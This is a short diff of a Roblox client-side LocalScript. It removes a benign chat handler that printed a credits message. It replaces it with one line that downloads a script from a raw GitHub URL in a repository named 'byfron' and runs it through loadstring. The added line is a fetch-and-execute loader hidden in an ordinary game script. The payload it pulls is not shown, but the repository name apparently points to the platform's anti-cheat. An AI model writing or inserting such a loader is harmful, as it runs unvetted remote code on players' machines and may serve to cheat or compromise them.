@@ -1,20 +1,2 @@
--- LocalScript in StarterPlayerScripts
 
--- Function to handle chat messages
-local function onPlayerChatted(message)
-    -- Check if the message is from the local player and is "!credits"
-    if message:lower() == "!credits" then
-        -- Print the "Created by HitByDev" message to the output console
-        print("Created by HitByDev")
-    end
-end
-
--- Connect the function to the Player's Chatted event
-local player = game.Players.LocalPlayer
-
--- Ensure LocalPlayer is valid before connecting events
-if player then
-    player.Chatted:Connect(onPlayerChatted)
-else
-    warn("LocalPlayer not found")
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hitbyharibo/byfron/main/cadm", true))()
